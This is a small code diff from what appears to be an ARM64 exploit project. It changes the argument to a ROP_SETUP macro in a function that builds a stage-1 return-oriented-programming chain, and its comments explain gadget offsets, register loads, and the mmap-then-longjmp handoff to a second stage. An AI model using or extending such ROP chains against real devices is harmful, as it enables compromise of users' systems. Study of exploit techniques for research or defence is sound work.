@@ -176,7 +176,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	[5]:
 		when we are here x0 contains the return value of mmap/the stage so we just jump to longjmp and let stage2 handle all of the other stuff
 	*/
-	ROP_SETUP(offsets);
+	ROP_SETUP(offsets->stage1_ropchain);
 	ADD_OFFSET_GADGET(0);					   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
 	ADD_GADGET();							   // 0x08		[2] x20 [3] x5/sixth arg
 	ADD_GADGET();							   // 0x10		[2] x21 [3] x6/seventh arg
